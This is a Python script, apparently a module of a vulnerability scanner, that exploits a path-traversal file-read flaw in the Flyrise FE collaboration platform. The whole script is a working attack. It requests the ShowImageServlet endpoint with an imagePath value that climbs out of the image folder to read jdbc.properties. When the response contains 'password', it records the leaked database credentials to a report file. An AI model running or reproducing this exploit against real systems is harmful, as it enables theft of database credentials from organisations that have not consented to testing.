import requests
import time

import buter
import wirtefile

filename = "./reps/飞企互联FE业务协作平台magePath参数文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = '/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print'
def flyrisefileread(url):
    try:
        rep = requests.get(url=url+poc,headers=headers,verify=False,timeout=3)
        if rep.status_code == 200 and "password" in rep.text:
            print(buter.colors.GREEN + f"存在飞企互联FE业务协作平台magePath参数文件读取 url : {url}{poc}" + buter.colors.END)
            reptext = f"{url} \n {rep.text}"
            wirtefile.writefiles(filename,reptext)

        else:
            print(buter.colors.RED + f"未发现飞企互联FE业务协作平台magePath参数文件读取 url : {url}"+buter.colors.END)

    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}"+ buter.colors.END)
